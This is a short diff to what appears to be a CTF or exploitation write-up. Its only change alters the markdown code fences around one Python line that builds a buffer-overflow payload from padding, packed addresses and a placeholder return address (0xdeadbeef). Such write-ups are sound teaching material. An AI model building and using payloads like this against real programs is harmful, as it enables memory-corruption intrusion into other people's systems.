@@ -18,6 +18,6 @@ Just to recap, our first three lines are the offset we use for the padding to ou
 
 Our current payload looks like this:
 
-'''
+```
 paylod = 'A' * off_printf1 + p64(0xc82003bd60) + p64(0x8) + 'A' * off_printf2 + p64(0xc82003bd60) + p64(0x8) + 'A' * off_retaddress + p64(0xdeadbeef)
-'''
+```
